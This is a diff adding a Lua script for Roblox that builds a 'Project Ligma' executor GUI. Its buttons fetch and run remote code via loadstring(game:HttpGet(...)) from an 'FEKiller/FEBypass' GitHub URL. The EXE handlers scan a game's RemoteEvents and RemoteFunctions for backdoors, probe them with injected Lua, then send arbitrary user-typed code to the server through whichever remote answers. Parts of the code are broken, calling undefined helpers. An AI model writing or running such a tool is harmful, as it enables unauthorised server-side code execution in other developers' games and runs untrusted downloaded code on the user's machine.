@@ -1,0 +1,480 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+
+designed using localmaze gui creator
+]=]
+
+local LMG2L = {};
+
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["Frame_2"]["Active"] = true;
+LMG2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Frame_2"]["Selectable"] = true;
+LMG2L["Frame_2"]["Size"] = UDim2.new(0.48889, 0, 0.38298, 0);
+LMG2L["Frame_2"]["Position"] = UDim2.new(0.1463, 0, 0.2234, 0);
+LMG2L["Frame_2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+
+
+LMG2L["FEBypass_3"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["FEBypass_3"]["TextWrapped"] = true;
+LMG2L["FEBypass_3"]["BorderSizePixel"] = 0;
+LMG2L["FEBypass_3"]["TextScaled"] = true;
+LMG2L["FEBypass_3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["FEBypass_3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["FEBypass_3"]["Size"] = UDim2.new(0.20455, 0, 0.22222, 0);
+LMG2L["FEBypass_3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["FEBypass_3"]["Text"] = [[FE Bypass]];
+LMG2L["FEBypass_3"]["Name"] = [[FEBypass]];
+LMG2L["FEBypass_3"]["Style"] = Enum.ButtonStyle.RobloxRoundDropdownButton;
+LMG2L["FEBypass_3"]["Position"] = UDim2.new(0.78409, 0, 0.60417, 0);
+
+
+LMG2L["LocalScript4_4"] = Instance.new("LocalScript", LMG2L["FEBypass_3"]);
+LMG2L["LocalScript4_4"]["Name"] = [[LocalScript4]];
+
+
+LMG2L["LocalScript2_5"] = Instance.new("LocalScript", LMG2L["FEBypass_3"]);
+LMG2L["LocalScript2_5"]["Name"] = [[LocalScript2]];
+
+
+LMG2L["LocalScript3_6"] = Instance.new("LocalScript", LMG2L["FEBypass_3"]);
+LMG2L["LocalScript3_6"]["Name"] = [[LocalScript3]];
+
+
+LMG2L["LocalScript_7"] = Instance.new("LocalScript", LMG2L["FEBypass_3"]);
+
+
+
+LMG2L["Draggable1_8"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
+LMG2L["Draggable1_8"]["Name"] = [[Draggable1]];
+
+
+LMG2L["Status_9"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
+LMG2L["Status_9"]["TextWrapped"] = true;
+LMG2L["Status_9"]["BorderSizePixel"] = 0;
+LMG2L["Status_9"]["TextScaled"] = true;
+LMG2L["Status_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Status_9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Status_9"]["BackgroundTransparency"] = 1;
+LMG2L["Status_9"]["Size"] = UDim2.new(0.08712, 0, 0.04861, 0);
+LMG2L["Status_9"]["Text"] = [[Status:]];
+LMG2L["Status_9"]["Name"] = [[Status]];
+LMG2L["Status_9"]["Position"] = UDim2.new(0.01136, 0, 0.9375, 0);
+
+
+LMG2L["Clear_a"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["Clear_a"]["TextWrapped"] = true;
+LMG2L["Clear_a"]["BorderSizePixel"] = 0;
+LMG2L["Clear_a"]["TextScaled"] = true;
+LMG2L["Clear_a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Clear_a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Clear_a"]["Size"] = UDim2.new(0.20455, 0, 0.22222, 0);
+LMG2L["Clear_a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Clear_a"]["Text"] = [[CLEAR]];
+LMG2L["Clear_a"]["Name"] = [[Clear]];
+LMG2L["Clear_a"]["Style"] = Enum.ButtonStyle.RobloxRoundDropdownButton;
+LMG2L["Clear_a"]["Position"] = UDim2.new(0.78409, 0, 0.36111, 0);
+
+
+LMG2L["LocalScript_b"] = Instance.new("LocalScript", LMG2L["Clear_a"]);
+
+
+
+LMG2L["Status2_c"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
+LMG2L["Status2_c"]["TextWrapped"] = true;
+LMG2L["Status2_c"]["BorderSizePixel"] = 0;
+LMG2L["Status2_c"]["TextScaled"] = true;
+LMG2L["Status2_c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Status2_c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Status2_c"]["BackgroundTransparency"] = 1;
+LMG2L["Status2_c"]["Size"] = UDim2.new(0.31818, 0, 0.04861, 0);
+LMG2L["Status2_c"]["Text"] = [[FilteringEnabled = true]];
+LMG2L["Status2_c"]["Name"] = [[Status2]];
+LMG2L["Status2_c"]["Position"] = UDim2.new(0.06818, 0, 0.9375, 0);
+
+
+LMG2L["Draggable4_d"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
+LMG2L["Draggable4_d"]["Name"] = [[Draggable4]];
+
+
+LMG2L["FEChecker_e"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["FEChecker_e"]["TextWrapped"] = true;
+LMG2L["FEChecker_e"]["BorderSizePixel"] = 0;
+LMG2L["FEChecker_e"]["TextScaled"] = true;
+LMG2L["FEChecker_e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["FEChecker_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["FEChecker_e"]["Size"] = UDim2.new(0.20455, 0, 0.13194, 0);
+LMG2L["FEChecker_e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["FEChecker_e"]["Text"] = [[Check FE]];
+LMG2L["FEChecker_e"]["Name"] = [[FEChecker]];
+LMG2L["FEChecker_e"]["Style"] = Enum.ButtonStyle.RobloxRoundDropdownButton;
+LMG2L["FEChecker_e"]["Position"] = UDim2.new(0.78409, 0, 0.85417, 0);
+
+
+LMG2L["LocalScript_f"] = Instance.new("LocalScript", LMG2L["FEChecker_e"]);
+
+
+
+LMG2L["LocalScript2_10"] = Instance.new("LocalScript", LMG2L["FEChecker_e"]);
+LMG2L["LocalScript2_10"]["Name"] = [[LocalScript2]];
+
+
+LMG2L["LocalScript3_11"] = Instance.new("LocalScript", LMG2L["FEChecker_e"]);
+LMG2L["LocalScript3_11"]["Name"] = [[LocalScript3]];
+
+
+LMG2L["exec_12"] = Instance.new("TextButton", LMG2L["Frame_2"]);
+LMG2L["exec_12"]["TextWrapped"] = true;
+LMG2L["exec_12"]["BorderSizePixel"] = 0;
+LMG2L["exec_12"]["TextScaled"] = true;
+LMG2L["exec_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["exec_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["exec_12"]["Size"] = UDim2.new(0.20455, 0, 0.22222, 0);
+LMG2L["exec_12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["exec_12"]["Text"] = [[EXE]];
+LMG2L["exec_12"]["Name"] = [[exec]];
+LMG2L["exec_12"]["Style"] = Enum.ButtonStyle.RobloxRoundDropdownButton;
+LMG2L["exec_12"]["Position"] = UDim2.new(0.78409, 0, 0.11806, 0);
+
+
+LMG2L["LocalScript_13"] = Instance.new("LocalScript", LMG2L["exec_12"]);
+
+
+
+LMG2L["LocalScript_14"] = Instance.new("LocalScript", LMG2L["exec_12"]);
+
+
+
+LMG2L["ImageButton_15"] = Instance.new("ImageButton", LMG2L["Frame_2"]);
+LMG2L["ImageButton_15"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton_15"]["BackgroundTransparency"] = 1;
+-- LMG2L["ImageButton_15"]["ImageContent"] = ;
+LMG2L["ImageButton_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageButton_15"]["Image"] = [[rbxassetid://87162794]];
+LMG2L["ImageButton_15"]["Size"] = UDim2.new(0.05682, 0, 0.10417, 0);
+LMG2L["ImageButton_15"]["Position"] = UDim2.new(0.00379, 0, 0.00694, 0);
+
+
+LMG2L["Name_16"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
+LMG2L["Name_16"]["TextWrapped"] = true;
+LMG2L["Name_16"]["BorderSizePixel"] = 0;
+LMG2L["Name_16"]["TextScaled"] = true;
+LMG2L["Name_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Name_16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Name_16"]["BackgroundTransparency"] = 1;
+LMG2L["Name_16"]["Size"] = UDim2.new(0.23485, 0, 0.05556, 0);
+LMG2L["Name_16"]["Text"] = [[Project Ligma]];
+LMG2L["Name_16"]["Name"] = [[Name]];
+LMG2L["Name_16"]["Position"] = UDim2.new(0.04545, 0, 0.04167, 0);
+
+
+LMG2L["TextBox_17"] = Instance.new("TextBox", LMG2L["Frame_2"]);
+LMG2L["TextBox_17"]["TextWrapped"] = true;
+LMG2L["TextBox_17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextBox_17"]["TextScaled"] = true;
+LMG2L["TextBox_17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextBox_17"]["Size"] = UDim2.new(0.73485, 0, 0.79167, 0);
+LMG2L["TextBox_17"]["Position"] = UDim2.new(0.0303, 0, 0.11806, 0);
+LMG2L["TextBox_17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextBox_17"]["Text"] = [[]];
+
+
+LMG2L["Draggable2_18"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
+LMG2L["Draggable2_18"]["Name"] = [[Draggable2]];
+
+
+local function C_4()
+	local script = LMG2L["LocalScript4_4"];
+	local button = script.Parent	
+	local frame = script.Parent.Parent	
+	local status = frame:FindFirstChild("Status2")	
+	
+	button.MouseButton1Click:Connect(function()	
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/4izikRBX/FEKiller/refs/heads/main/FEBypass"))()	
+	    status.Text = "FilteringEnabled = false"	
+	end)	
+end;
+task.spawn(C_4);
+local function C_5()
+	local script = LMG2L["LocalScript2_5"];
+	local button = script.Parent	
+	local frame = button.Parent	
+	local status = frame:FindFirstChild("StatusLabel2")	
+	
+	button.MouseButton1Click:Connect(function()	
+	    -- Ждём загрузки персонажа	
+	    local player = game.Players.LocalPlayer	
+	    local character = player.Character or player.CharacterAdded:Wait()	
+	    player.CharacterAdded:Wait() -- дополнительная гарантия	
+	    	
+	    task.wait(1) -- небольшая пауза	
+	    	
+	    local success, err = pcall(function()	
+	        loadstring(game:HttpGet("https://raw.githubusercontent.com/4izikRBX/FEKiller/refs/heads/main/FEBypass"))()	
+	    end)	
+	    	
+	    if success then	
+	        if status then	
+	            status.Text = "FilteringEnabled = false"	
+	        end	
+	    else	
+	        if status then	
+	            status.Text = "Ошибка: " .. tostring(err):sub(1, 30)	
+	        end	
+	        warn("Ошибка загрузки: ", err)	
+	    end	
+	end)	
+end;
+task.spawn(C_5);
+local function C_6()
+	local script = LMG2L["LocalScript3_6"];
+	local button = script.Parent	
+	local frame = script.Parent.Parent	
+	local status = frame:FindFirstChild("Status2")	
+	
+	button.MouseButton1Click:Connect(function()	
+	    status.Text = "FilteringEnabled = false"	
+	end)	
+end;
+task.spawn(C_6);
+local function C_7()
+	local script = LMG2L["LocalScript_7"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/4izikRBX/FEKiller/refs/heads/main/FEBypass"))()	
+	end)	
+end;
+task.spawn(C_7);
+local function C_8()
+	local script = LMG2L["Draggable1_8"];
+	script.Parent.Active = true	
+end;
+task.spawn(C_8);
+local function C_b()
+	local script = LMG2L["LocalScript_b"];
+	local button = script.Parent	
+	local frame = button.Parent	
+	local textbox = frame:WaitForChild("TextBox")	
+	
+	button.MouseButton1Click:Connect(function()	
+		textbox.Text = ""	
+	end)	
+end;
+task.spawn(C_b);
+local function C_d()
+	local script = LMG2L["Draggable4_d"];
+	script.Parent.Draggable = true	
+end;
+task.spawn(C_d);
+local function C_f()
+	local script = LMG2L["LocalScript_f"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+		loadstring(game:HttpGet("https://rawscripts/raw/Universal-Script-FE-checker-41897"))()	
+	end)	
+end;
+task.spawn(C_f);
+local function C_10()
+	local script = LMG2L["LocalScript2_10"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+	    if game.Workspace.FilteringEnabled == true then	
+	        local Hint = Instance.new("Hint", workspace)	
+	        Hint.Text = "FE is Enabled"	
+	        task.wait(4.0)	
+	        Hint:Destroy()	
+	    else	
+	        local Hint = Instance.new("Hint", workspace)	
+	        Hint.Text = "FE is Disabled"	
+	        task.wait(4.0)	
+	        Hint:Destroy()	
+	    end	
+	end)	
+end;
+task.spawn(C_10);
+local function C_11()
+	local script = LMG2L["LocalScript3_11"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+	    if game.Workspace.FilteringEnabled == true then	
+	        local Hint = Instance.new("Hint", workspace)	
+	        Hint.Text = "FE is Enabled"	
+	        task.wait(4.0)	
+	        Hint:Destroy()	
+	    else	
+	        local Hint = Instance.new("Hint", workspace)	
+	        Hint.Text = "FE is Disabled"	
+	        task.wait(4.0)	
+	        Hint:Destroy()	
+	    end	
+	end)	
+end;
+task.spawn(C_11);
+local function C_13()
+	local script = LMG2L["LocalScript_13"];
+	local button = script.Parent	
+	local frame = button.Parent	
+	local textbox = frame:FindFirstChildWhichIsA("TextBox")	
+	
+	local function getRemote()	
+		for _, v in pairs(game:GetDescendants()) do	
+			if v:IsA("RemoteEvent") then	
+				local n = v.Name:lower()	
+				if n:find("exec") 	
+				   or n:find("server") 	
+				   or n:find("backdoor") 	
+				   or n:find("load") 	
+				   or n:find("remote") 	
+				   or n:find("admin") 	
+				   or v.Name == "RemoteEvent" 	
+				   or v.Name == "Remote Event" then	
+					return v	
+				end	
+			end	
+		end	
+		return nil	
+	end	
+	
+	local function execute()	
+		local code = textbox and textbox.Text or ""	
+		if code == "" then return end	
+	
+		local remote = getRemote()	
+		if not remote then	
+			warn("No RemoteEvent found.")	
+			return	
+		end	
+	
+		pcall(function()	
+			remote:FireServer(code)	
+		end)	
+	end	
+	
+	button.MouseButton1Click:Connect(execute)	
+end;
+task.spawn(C_13);
+local function C_14()
+	local script = LMG2L["LocalScript_14"];
+	-- exec.LocalScript (оригинальный фрагмент из Project Ligma)	
+	
+	local button = script.Parent  -- Кнопка EXE	
+	local frame = button.Parent	
+	local textbox = frame:FindFirstChildWhichIsA("TextBox")	
+	
+	local backdoorRemote = nil	
+	local isSearching = false	
+	
+	-- Поиск бэкдора (запускается ТОЛЬКО при нажатии EXE)	
+	local function findBackdoor()	
+	    if isSearching then return nil end	
+	    isSearching = true	
+	    	
+	    local remotes = {}	
+	    local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+	    	
+	    -- Защищённый бэкдор	
+	    local protectedBackdoor = ReplicatedStorage:FindFirstChild('lh' .. game.PlaceId/6666*1337*game.PlaceId)	
+	    if protectedBackdoor and protectedBackdoor:IsA('RemoteFunction') then	
+	        local code = generateName(math.random(12,30))	
+	        task.spawn(function() 	
+	            protectedBackdoor:InvokeServer("", "a=Instance.new('Model',workspace)a.Name='"..code.."'") 	
+	        end)	
+	        remotes[code] = protectedBackdoor	
+	    end	
+	    	
+	    -- Поиск по всем Remote	
+	    for _, remote in ipairs(game:GetDescendants()) do	
+	        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then	
+	            local fullName = remote:GetFullName()	
+	            if string.split(fullName, '.')[1] ~= 'RobloxReplicatedStorage' then	
+	                local code = generateName(math.random(12,30))	
+	                runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")	
+	                remotes[code] = remote	
+	            end	
+	        end	
+	    end	
+	    	
+	    -- Проверка результатов	
+	    for i = 1, 50 do	
+	        for code, remote in pairs(remotes) do	
+	            if workspace:FindFirstChild(code) then	
+	                isSearching = false	
+	                return remote	
+	            end	
+	        end	
+	        task.wait()	
+	    end	
+	    	
+	    isSearching = false	
+	    return nil	
+	end	
+	
+	-- КНОПКА EXE: поиск бэкдора и выполнение кода	
+	local function execute()	
+	    local code = textbox and textbox.Text or ""	
+	    if code == "" then 	
+	        warn("No code entered.")	
+	        return 	
+	    end	
+	    	
+	    -- Бэкдор ищется ТОЛЬКО здесь, при первом нажатии EXE	
+	    if not backdoorRemote then	
+	        button.Text = "SEARCHING..."	
+	        backdoorRemote = findBackdoor()  -- <-- ПОИСК ЗДЕСЬ	
+	        if not backdoorRemote then	
+	            button.Text = "EXE"	
+	            warn("No backdoor found.")	
+	            return	
+	        end	
+	        button.Text = "EXE"	
+	    end	
+	    	
+	    -- Выполнение кода через найденный бэкдор	
+	    pcall(function()	
+	        if backdoorRemote:IsA('RemoteEvent') then	
+	            backdoorRemote:FireServer(code)	
+	        elseif backdoorRemote:IsA('RemoteFunction') then	
+	            backdoorRemote:InvokeServer(code)	
+	        end	
+	    end)	
+	end	
+	
+	button.MouseButton1Click:Connect(execute)	
+end;
+task.spawn(C_14);
+local function C_18()
+	local script = LMG2L["Draggable2_18"];
+	local player = game.Players.LocalPlayer	
+	local mouse = player:GetMouse()	
+	
+	mouse.Button1Down:Connect(function()	
+		script.Parent.Holding.Value = true	
+	end)	
+	
+	mouse.Button1Up:Connect(function()	
+		script.Parent.Holding.Value = false	
+	end)	
+	
+	mouse.Move:Connect(function()	
+		if script.Parent.Holding.Value == true then	
+			script.Parent.Frame.Position = UDim2.new(0,mouse.X,0,mouse.Y)	
+		end	
+	end)	
+end;
+task.spawn(C_18);
+
+return LMG2L["ScreenGui_1"], require;
